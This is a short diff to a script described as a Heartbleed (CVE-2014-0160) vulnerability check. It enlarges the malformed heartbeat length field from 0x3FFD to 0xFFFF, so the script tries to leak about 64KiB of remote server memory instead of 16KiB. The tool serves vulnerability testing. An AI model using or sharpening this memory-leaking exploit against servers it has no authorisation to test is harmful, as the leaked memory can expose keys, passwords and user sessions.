@@ -3,7 +3,7 @@
 # ******************************************************************************
 # OpenSSL CVE-2014-0160 ("Heartbleed") vulnerability check over TLS 1.2
 # ******************************************************************************
-# This script will try to steal ~ 16Kib from the remote server memory and
+# This script will try to steal ~ 64Kib from the remote server memory and
 # display data content if successful. It will send a ClientHello message with a
 # very complete cipher suite list. The only TLS extension used is the Heartbeat
 # extension.
@@ -310,7 +310,7 @@ TLS_HANDSHAKE_PROTOCOL = [
 
 TLS_HEARTBEAT_PROTOCOL = [
   0x01,
-  0x3F, 0xFD
+  0xFF, 0xFF
 ]
 
 # Assemble header and protocol data
